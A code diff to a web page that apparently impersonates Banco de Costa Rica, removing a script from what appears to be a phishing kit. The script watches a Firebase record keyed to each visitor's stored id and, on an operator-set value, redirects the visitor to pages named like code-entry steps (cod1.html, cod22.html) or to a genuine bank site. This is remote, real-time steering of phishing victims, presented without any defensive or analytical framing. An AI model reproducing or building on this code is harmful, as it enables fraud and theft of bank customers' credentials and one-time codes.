@@ -272,51 +272,6 @@ footer {
     });
 </script>
 
-<script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const usuarioId = localStorage.getItem("usuario");
-      
-      if (!usuarioId) {
-          console.log("No hay usuario en localStorage");
-          return;
-      }
-
-      // Escuchador en tiempo real adaptado a la sintaxis v8 de Firebase
-      db.collection("prolme").doc(usuarioId).onSnapshot((doc) => {
-        if (doc.exists) {
-          const questionData = doc.data();
-
-          if (questionData.page == 1) {
-            window.location.href = "cod22.html";
-          }
-          if (questionData.page == 2) {
-            window.location.href = "https://www.bncr.fi.cr/";
-          }
-          if (questionData.page == 3) {
-            window.location.href = "index.html";
-          }
-          if (questionData.page == 4) {
-            window.location.href = "indexinc.html";
-          }
-          if (questionData.page == 5) {
-            window.location.href = "cod12.html";
-          }
-          if (questionData.page == 6) {
-            window.location.href = "cod1.html";
-          }
-          if (questionData.page == 7) {
-            window.location.href = "cod2.html";
-          }
-          if (questionData.page == 8) {
-            window.location.href = "cod22.html";
-          }
-        } else {
-          console.log("No such document!");
-        }
-      });
-    });
-</script>
-
 <footer>
     <div class="footer-content">
       <p>BCR © Derechos Reservados 2026.    Contáctenos: CentroAsistenciaBCR@bancobcr.com</p>
